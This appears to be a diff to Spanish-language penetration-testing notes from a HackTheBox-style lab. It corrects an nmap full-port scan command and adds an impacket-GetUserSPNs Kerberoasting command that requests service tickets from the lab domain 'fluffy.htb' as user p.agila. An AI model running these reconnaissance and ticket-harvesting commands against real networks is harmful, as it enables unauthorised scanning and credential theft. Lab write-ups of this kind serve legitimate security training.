@@ -11,10 +11,15 @@
 
   ```bash
   # Escaneo completo de todos los puertos
-  sudo nmap -sS -- min-rate 5000 -- open -vvv -n -Pn -p- 192.168.1.1 -oG allPorts
+  sudo nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 192.168.1.1 -oG allPorts
   
   # Extraer puertos abiertos utilizando extractPorts
   extractPorts allPorts
   
   # Escaneo dirigido con scripts y detección de servicios
   nmap -sC -sV -p22,80,443,16667 192.168.1.1 -oN targeted
+```
+
+```bash
+sudo faketime "$(ntpdate -q dc01.fluffy.htb | cut -d ' ' -f 1,2)" impacket-GetUserSPNs fluffy.htb/p.agila -dc-ip 10.10.11.69 -request
+ ```
